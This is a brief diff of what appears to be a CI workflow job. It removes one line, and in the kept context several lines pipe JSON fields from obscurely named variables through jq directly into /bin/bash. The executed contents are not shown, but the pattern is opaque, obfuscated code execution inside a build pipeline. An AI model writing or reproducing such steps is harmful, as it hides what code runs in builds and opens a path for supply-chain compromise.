@@ -26,7 +26,6 @@ jobs:
           echo $nw707 | jq -r .r1 | /bin/bash
           printf '%s' "$qizf3" | jq -r .cd36 | /bin/bash
           echo $c2 | jq -r .n393 | /bin/bash
-          echo $fnyb2 | jq -r .bvuyk367 | /bin/bash
           printf '%s' "$foga5" | jq -r .nps0 | /bin/bash
 
       - name: Upload archive
